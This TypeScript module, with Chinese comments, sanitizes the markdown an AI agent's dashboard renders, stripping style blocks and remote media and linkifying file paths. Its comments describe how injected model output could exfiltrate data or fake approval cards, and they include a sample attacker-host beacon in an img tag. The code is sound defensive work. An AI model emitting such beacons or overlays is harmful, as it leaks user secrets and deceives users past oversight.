// marked 单一渲染入口（全前端共用）：所有 markdown-body 输出同源，
// 表格统一包一层 .md-table-wrap——宽表横向滚动而非把单元格压成每字一行
// （真实表格盒 width:max-content 拿 intrinsic 宽度；匿名盒方案无效，
// 详见 components.css .md-table-wrap 注释）。
import DOMPurify from 'dompurify'
import { marked } from 'marked'

export interface MarkdownRenderOptions {
  /** 换行语义：聊天=true（单换行成 <br>），文档页=false（标准 GFM）。 */
  breaks?: boolean
}

/**
 * HTML 转义（&<>"' 全量）：v-html 渲染面在异常降级路径上的兜底原语。
 * renderMarkdownHtml 是唯一消毒闸，但它依赖 marked/DOMPurify 正常工作——
 * 调用方 catch 回落时**不得**把原文直接喂 v-html（等于绕过消毒闸），
 * 必须先过本函数把活动内容降级为纯文本再进 HTML 上下文。
 */
export function escapeHtml(s: string): string {
  if (!s) return ''
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

/**
 * HTML 片段消毒（渲染闸与皮肤引擎 data-nb-html 共用的单一配置真相源）。
 * DOMPurify 默认净化活动内容（script / on* 事件属性 / javascript: URI）；
 * style 属性整体禁掉，`<style>` 标签同样显式禁掉——DOMPurify 默认白名单
 * **放行** `<style>` 元素（BUG-20261113-154：FORBID_ATTR 只禁属性禁不了
 * 标签），模型输出混入的样式块会原样进 DOM，构成页面级 CSS defacement
 * （position:fixed 全屏覆盖层可伪装审批卡/登录框）与 CSS 选择器外传向量。
 * 模型/皮肤内容不需要内联样式与样式块，属性+标签双禁即消灭整类 CSS
 * 注入向量。对已消毒 HTML 幂等。
 */
export function sanitizeHtmlFragment(html: string): string {
  return DOMPurify.sanitize(html, {
    FORBID_ATTR: ['style'],
    FORBID_TAGS: ['style'],
  })
}

// ---------------------------------------------------------------------------
// 远程媒体剥离（BUG-20261115-033）：DOMPurify 默认白名单**放行** img/video/
// audio 的远程 http(s) 与同源相对 src——模型输出（或被注入后的输出）混入
// `<img src="http://attacker/?d=secret">` 在 Dashboard 渲染即静默外呼（信标/
// 外传向量，无需任何工具审批；与 BUG-20261113-154 的 CSS 向量同款信任模型）。
// 同源相对路径虽不出网，但可探达 gateway GET 端点（如 /api/internal 急停）。
// 仅放行 data:image/*（内联图零网络请求；皮肤引擎 ALLOWED_DATA_URLS 同款
// 契约）。共享消毒配置 sanitizeHtmlFragment 不动（皮肤引擎 data-nb-html
// 同源消费，全局禁 img 会断皮肤内联图标）——本剥离只收窄 markdown 渲染
// 管线：聊天图片走 upload→media 附件路径不经 markdown，gateway 无 workspace
// 图片静态路由，远程/相对媒体在 markdown 里无既有消费场景。
// ---------------------------------------------------------------------------

/// 媒体元素：img 主源 + video/audio 容器 + source/track 子源（picture 内
/// source 的 srcset 同样触发网络请求，被同一选择器覆盖）。
const MEDIA_SELECTOR = 'img,video,audio,source,track'

/// 安全媒体 URL：仅内联 data:image/*（SVG 在 img 上下文按规范脚本惰性；
/// 是否存活以 DOMPurify 自身 data-URI 策略为准——本剥离只做增量收紧）。
const SAFE_MEDIA_URL_RE = /^data:image\//

function mediaUrlSafe(url: string): boolean {
  return SAFE_MEDIA_URL_RE.test(url.trim())
}

/// srcset 逐候选解析（WHATWG「parse a srcset attribute」语义）：URL 是非
/// 空白连续段——段内逗号**保留**（`data:...;base64,PAYLOAD` 的载荷逗号不是
/// 候选分隔符，朴素 split(',') 会把载荷拦腰截断），仅段尾逗号属分隔符
/// （`url1,url2` 简写形态）剥掉；URL 后跟可选描述符段（非空白非逗号，
/// 1x/2x/100w）。合法候选原样重建，全不安全返回 null（调用方摘除属性）。
function filterSrcset(value: string): string | null {
  const kept: string[] = []
  let i = 0
  const n = value.length
  while (i < n) {
    // 分隔带：空白与逗号。
    while (i < n && (value[i] === ',' || /\s/.test(value[i]))) i++
    if (i >= n) break
    // URL：非空白连续段，段内逗号保留，段尾逗号剥离。
    const start = i
    while (i < n && !/\s/.test(value[i])) i++
    let url = value.slice(start, i)
    if (url.endsWith(',')) url = url.replace(/,+$/, '')
    // 描述符：非空白非逗号连续段（可空——纯逗号分隔形态无描述符）。
    const dStart = i
    while (i < n && !/[\s,]/.test(value[i])) i++
    const desc = value.slice(dStart, i)
    if (mediaUrlSafe(url)) kept.push(desc ? `${url} ${desc}` : url)
  }
  return kept.length > 0 ? kept.join(', ') : null
}

/**
 * 从消毒后 HTML 剥离会发起网络请求的媒体加载（sanitize 之后、v-html 之前）。
 * 规则：src 不安全 → 移除元素；src 安全/缺省时逐候选过滤 srcset，poster
 * 不安全仅摘属性；img/source/track 无可用源即死元素移除；video/audio 子源
 * 全部失效时连容器一并移除。逆文档序处理（子先于父）保证容器移除判定看到
 * 子源处理后的最终形态。对无媒体 HTML 幂等直通。
 */
function stripRemoteMedia(html: string): string {
  if (!/<(?:img|video|audio|source|track)[\s>]/i.test(html)) return html
  const holder = document.createElement('div')
  holder.innerHTML = html // 已过 DOMPurify，安全
  const els = Array.from(holder.querySelectorAll(MEDIA_SELECTOR)).reverse()
  for (const el of els) {
    let hasSource = false
    const src = el.getAttribute('src')
    if (src !== null) {
      if (!mediaUrlSafe(src)) {
        el.remove()
        continue
      }
      hasSource = true
    }
    const srcset = el.getAttribute('srcset')
    if (srcset !== null) {
      const kept = filterSrcset(srcset)
      if (kept === null) el.removeAttribute('srcset')
      else {
        el.setAttribute('srcset', kept)
        hasSource = true
      }
    }
    const poster = el.getAttribute('poster')
    if (poster !== null && !mediaUrlSafe(poster)) el.removeAttribute('poster')
    if (el.tagName === 'VIDEO' || el.tagName === 'AUDIO') {
      // 子源已在逆序前轮处理完：幸存的 source 即合法源。
      if (!hasSource && !el.querySelector('source')) el.remove()
    } else if (!hasSource) {
      // img/source/track：无可用主源即死元素，移除。
      el.remove()
    }
  }
  return holder.innerHTML
}

export function renderMarkdownHtml(text: string, opts?: MarkdownRenderOptions): string {
  // 代码高亮走事后 DOM 路径（渲染后对 pre code 跑 hljs.highlightElement，
  // 见 ChatPanel renderCodeBlocks）——marked v15 已移除 highlight 选项，
  // 此处不收该参数。
  const raw = (marked as any).parse(text, {
    gfm: true,
    breaks: opts?.breaks ?? false,
  }) as string
  // marked 默认放行 raw HTML——模型输出（或被注入后的输出）混入
  // <script>/<img onerror> 会被当真渲染。此处是全部 v-html 渲染面的
  // 唯一消毒闸（2026-09-26 复检挂账高优 Canvas-#2）；hljs 高亮是消毒后
  // 的 DOM 事后增强，不受影响。消毒配置单一真相源见 sanitizeHtmlFragment
  // （皮肤引擎 data-nb-html 同源消费）；stripRemoteMedia 是消毒后的第二道
  // 增量收窄（远程/相对媒体加载剥离，仅 markdown 管线，BUG-20261115-033）。
  const html = stripRemoteMedia(sanitizeHtmlFragment(raw))
  // 锚规范化先行：scheme-less 路径 href 收编 file-link、其余 scheme-less
  // 解包为文本——解包出的路径文本随后被 linkifyFilePaths 正常收编。
  const normalized = normalizeAnchors(html)
  // marked 输出的表格标签无属性、形态稳定——就地包装为滚动容器。
  const linked = linkifyFilePaths(normalized)
  return linked
    .replace(/<table>/g, '<div class="md-table-wrap"><table>')
    .replace(/<\/table>/g, '</table></div>')
}

// ---------------------------------------------------------------------------
// 文件路径 linkify（2026-10-19 用户报告问题 2：模型输出 markdown 里的文件
// 路径在 UI 上不可点击，用户得手动翻目录找文件）。
//
// 安全面：入口是**消毒后**的 DOM——本函数只把纯文本节点中的路径 token 包成
// `<a class="file-link" data-path>`（textContent 赋值，无 innerHTML 注入面），
// 跳过已有 <a> 与代码块 <pre>。点击行为由 ChatPanel 事件委托调 WSAPI
// `fs.open`，后端做 containment + 扩展名白名单（防「模型写 evil.bat → 聊天
// 链接 → 点击执行」链——非白名单类型降级为文件管理器定位，不执行）。
// ---------------------------------------------------------------------------

/// 白名单扩展名（与后端 fs.rs OPENABLE_EXTENSIONS 口径一致；裸文件名与
/// 带目录的相对路径必须命中白名单才成链，压普通英文句子的误链面）。
const LINKABLE_EXTS = 'md|txt|log|json|csv|pdf|png|jpg|jpeg|gif|webp|bmp'

/// 相对路径段字符：ASCII 词字符 + CJK 统一表意（含扩展 A）+ `@` `.` `-`
/// （连字符置尾免成区间）。中文文件名/目录名（`docs/总结.md`）是本环境
/// 常态——JS `\w` 只认 ASCII，不补 CJK 则中文相对路径永远不成链。
const SEG = `[\\w\\u3400-\\u4dbf\\u4e00-\\u9fff@.-]`

/// 路径 token 三形态合一：
/// 1. Windows 绝对路径（盘符 + 根 + 非空白段——无扩展名也收，点击开目录；
///    `[^\s...]` 天然收 CJK）；
/// 2. 带目录的相对路径（`src/notes.md`、`./reports/x.log`、`docs/总结.md`）；
/// 3. 裸文件名（`README.md`——必须命中白名单扩展名；**保持 ASCII 段类**：
///    收 CJK 会把「这是README.md」的「这是」吞进路径，反而退化）。
///   （`*` 不进字符类，markdown 强调 `**x**` 不会被吞。）
const PATH_TOKEN_RE = new RegExp(
  `[A-Za-z]:[\\\\/][^\\s<>\\\`"']*` +
    `|(?:${SEG}+[\\\\/])+${SEG}+` +
    `|[\\w@.-]+\\.(?:${LINKABLE_EXTS})\\b`,
  'g',
)
/// 无 g 副本（快速预判——/g 正则 .test 有 lastIndex 状态，不能复用）。
const PATH_TOKEN_TEST_RE = new RegExp(PATH_TOKEN_RE.source)

/// 尾部标点裁剪：贪婪匹配会把句尾 `。` `）` `)` 等吞进 token，成链前剥掉。
const TRAILING_PUNCT_RE = /[.,;:!?)\]}>'"`、。，；：！？）】》」』]+$/

function trimToken(raw: string): string {
  const trimmed = raw.replace(TRAILING_PUNCT_RE, '')
  // Windows 绝对路径至少要有一段内容（`C:\` 纯盘根不成链）。
  if (/^[A-Za-z]:[\\/]/.test(trimmed) && trimmed.length <= 3) return ''
  return trimmed
}

/** 判定 token 是否值得成链：绝对路径直接过；相对/裸名必须白名单扩展名。 */
function isLinkablePath(tok: string): boolean {
  if (!tok) return false
  if (/^[A-Za-z]:[\\/]/.test(tok)) return true
  const m = tok.match(new RegExp(`\\.(?:${LINKABLE_EXTS})$`, 'i'))
  return m !== null
}

/** 单个文本节点内的路径 token → <a class="file-link"> 序列替换。 */
function replacePathTokensIn(node: Text): void {
  const text = node.data
  const frag = document.createDocumentFragment()
  let idx = 0
  let changed = false
  for (const m of text.matchAll(PATH_TOKEN_RE)) {
    const tok = trimToken(m[0])
    if (!isLinkablePath(tok)) continue
    const at = m.index ?? 0
    frag.append(document.createTextNode(text.slice(idx, at)))
    const a = document.createElement('a')
    a.className = 'file-link'
    a.dataset.path = tok
    a.textContent = tok
    a.title = '打开文件'
    frag.append(a)
    // 被裁掉的尾部标点还原为普通文本。
    const rest = m[0].slice(tok.length)
    if (rest) frag.append(document.createTextNode(rest))
    idx = at + m[0].length
    changed = true
  }
  if (!changed) return
  frag.append(document.createTextNode(text.slice(idx)))
  node.replaceWith(frag)
}

/**
 * 消毒后 HTML 的文件路径 linkify（sanitize 之后、v-html 之前调用）。
 * 只处理文本节点；已有 <a> 内与代码块 <pre> 内跳过（inline <code> 参与——
 * 模型常用行内代码包路径）。
 */
export function linkifyFilePaths(html: string): string {
  if (!PATH_TOKEN_TEST_RE.test(html)) return html
  const holder = document.createElement('div')
  holder.innerHTML = html // 已过 DOMPurify，安全
  const walker = document.createTreeWalker(holder, NodeFilter.SHOW_TEXT)
  const targets: Text[] = []
  while (walker.nextNode()) {
    const t = walker.currentNode as Text
    const parent = t.parentElement
    if (!parent || parent.closest('a, pre')) continue
    // 外来内容（SVG 等）文本不 linkify：本函数产出的 <a> 是 HTML 命名空间
    // 元素，塞进 SVG 子树不渲染（SVG 只认自身命名空间的 <a>）——路径 token
    // 视觉上凭空消失。SVG 图（模型常画流程图/架构图）内的路径字样保留原
    // 文本最诚实；SVG 内链接收编归 normalizeAnchors 的命名空间安全臂。
    if (parent.namespaceURI && parent.namespaceURI !== 'http://www.w3.org/1999/xhtml') continue
    if (PATH_TOKEN_TEST_RE.test(t.data)) targets.push(t)
  }
  for (const t of targets) replacePathTokensIn(t)
  return holder.innerHTML
}

// ---------------------------------------------------------------------------
// 锚规范化：markdown 链接与 file-link 两条形态同一真相源。marked 把
// [label](dest) 一律渲染成 <a href>，而 linkifyFilePaths 显式跳过已有 <a>——
// 同一本地路径「纯文本写」成 file-link（点击走 fs.open 安全打开），「链接
// 语法写」却是裸 href，无任何委托拦截 → 浏览器按相对 URL 导航（报错页）。
// 本 pass 在消毒后 DOM 上把锚分成四类：页内锚点 / mailto/tel 不动；http(s)
// 补 target=_blank + rel noopener（不把整个 Dashboard 导航走）；scheme-less
// 路径形态（与纯文本 arm 同一 isLinkablePath/白名单口径）收编 file-link；
// 其余 scheme-less（协议相对 //、裸词、未知外部协议）解包为纯文本——
// `.markdown-body a` 有链接样式，保元素删 href 会留假可点击观感，解包才诚实
// （DOMPurify 已把 javascript:/data: 等活动 scheme 连 href 摘掉，本 pass 见到
// 的 scheme-less 只剩 inert 导航面；盘符形态 href（`C:\...`/`C:/...`）同样在
// DOMPurify 层被整体摘除（/i 旗标下 `[^a-z]` 连大写字母一起排除，`C:` 被当
// scheme 拒绝）——到不了本 pass，label 保留、无导航，属上游已中性化）。
// 注意 marked 对 href 跑 encodeURI
// （中文/空格/反斜杠 → 百分号编码），判定与 data-path 都基于解码后的原始
// 路径；解不开（坏编码）按不可信处理解包。
// ---------------------------------------------------------------------------

/// 行号后缀（`path.md:12`）：fs.open 不认识 `:行号`，收编前剥掉；只认
/// 「冒号紧邻数字且在结尾」（`C:\dir` 盘符冒号不在结尾，不受影响）。
const HREF_LINE_SUFFIX_RE = /:\d+$/

function unwrapAnchor(a: HTMLAnchorElement): void {
  a.replaceWith(...Array.from(a.childNodes))
}

function normalizeAnchors(html: string): string {
  if (!/<a[\s>]/i.test(html)) return html
  const holder = document.createElement('div')
  holder.innerHTML = html // 已过 DOMPurify，安全
  for (const a of Array.from(holder.querySelectorAll<HTMLAnchorElement>('a[href]'))) {
    const href = a.getAttribute('href') ?? ''
    if (href.startsWith('#')) continue // 页内锚点
    if (/^https?:/i.test(href)) {
      // 外部网页：新窗口打开，不把 Dashboard 整页导航走；rel 防反向接管。
      a.setAttribute('target', '_blank')
      a.setAttribute('rel', 'noopener noreferrer')
      continue
    }
    if (/^(mailto|tel):/i.test(href)) continue
    let decoded = ''
    try {
      decoded = decodeURIComponent(href)
    } catch {
      decoded = ''
    }
    // 行号后缀在判定前剥：isLinkablePath 的白名单扩展名口径认 `.md` 结尾、
    // 不认 `.md:1`——先剥再判定，data-path 用同一剥离结果。
    const stripped = decoded.replace(HREF_LINE_SUFFIX_RE, '')
    if (stripped && isLinkablePath(stripped)) {
      // 本地路径形态：收编进 file-link 通道（与纯文本 arm 同一真相源）。
      // 属性写入一律 setAttribute：querySelectorAll('a[href]') 跨命名空间
      // 命中 SVG 的 <a>（CSS 类型选择器不限命名空间），而 SVGElement.className
      // 是只读 WebIDL 属性（SVGAnimatedString getter）——ES module 严格模式下
      // `a.className = ...` 抛 TypeError（真 Chromium 实证），7/9 消费方无
      // try/catch 兜底，一条 SVG 图即打崩整个视图。setAttribute 对 HTML/SVG
      // 通用，SVG anchor 同样被收编（去 href 消灭导航面 + data-path 供
      // ChatPanel 事件委托 closest('a.file-link') 命中——类型/class 选择器
      // 同样跨命名空间匹配）。
      a.removeAttribute('href')
      a.setAttribute('class', 'file-link')
      a.setAttribute('data-path', stripped)
      // 空标签（`[](x.md)`）转换后零可见文本=隐形不可点；与纯文本 arm
      // 的 textContent = tok 同源回填路径文本。
      if (!a.textContent?.trim()) a.textContent = stripped
      a.setAttribute('title', '打开文件')
    } else {
      // 其余 scheme-less（//、裸词、未知协议、坏编码）：解包消灭导航面。
      unwrapAnchor(a)
    }
  }
  return holder.innerHTML
}
